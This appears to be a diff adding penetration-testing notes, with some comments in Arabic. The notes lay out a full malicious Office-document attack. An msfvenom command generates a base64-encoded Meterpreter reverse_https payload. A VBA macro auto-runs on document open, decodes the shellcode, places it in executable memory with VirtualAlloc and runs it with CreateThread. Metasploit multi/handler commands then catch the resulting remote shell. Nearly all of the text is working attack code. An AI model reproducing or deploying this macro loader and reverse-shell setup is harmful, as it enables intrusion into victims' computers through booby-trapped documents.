@@ -1,0 +1,83 @@
+
+// create payload with base 64
+
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw | base64 -w0
+
+
+// create macro code 
+
+-----------------------------------------------
+
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddress As LongPtr, _
+    ByVal dwSize As Long, _
+    ByVal flAllocationType As Long, _
+    ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal lpThreadAttributes As LongPtr, _
+    ByVal dwStackSize As Long, _
+    ByVal lpStartAddress As LongPtr, _
+    ByVal lpParameter As LongPtr, _
+    ByVal dwCreationFlags As Long, _
+    ByRef lpThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
+    ByVal Destination As LongPtr, _
+    ByRef Source As Any, _
+    ByVal Length As Long)
+
+Sub AutoOpen()
+    Call RunShellcode
+End Sub
+
+Sub Document_Open()
+    Call RunShellcode
+End Sub
+
+Function Base64Decode(base64Text As String) As Byte()
+    Dim xml As Object
+    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+    Dim node As Object
+    Set node = xml.createElement("b64")
+    node.DataType = "bin.base64"
+    node.Text = base64Text
+    Base64Decode = node.nodeTypedValue
+End Function
+
+Function RunShellcode()
+    Dim shellcodeBase64 As String
+    Dim shellcodeBytes() As Byte
+    Dim addr As LongPtr
+    Dim i As Long
+
+    ' الشيل كود بصيغة base64
+    shellcodeBase64 = "9EgQ8PCgiAAAQVBQUFIWQlFY..." ' ← الصق Base64 هنا
+
+    ' فك الشيل كود
+    shellcodeBytes = Base64Decode(shellcodeBase64)
+
+    ' حجز مساحة في الذاكرة
+    addr = VirtualAlloc(0, UBound(shellcodeBytes), &H3000, &H40)
+
+    ' نسخ الشيل كود للذاكرة
+    For i = LBound(shellcodeBytes) To UBound(shellcodeBytes)
+        RtlMoveMemory addr + i, shellcodeBytes(i), 1
+    Next i
+
+    ' تنفيذ الشيل كود
+    CreateThread 0, 0, addr, 0, 0, 0
+End Function
+
+
+-------------------------------------------------------------------------
+
+// use multi handler 
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.119.120
+set LPORT 443
+run
+
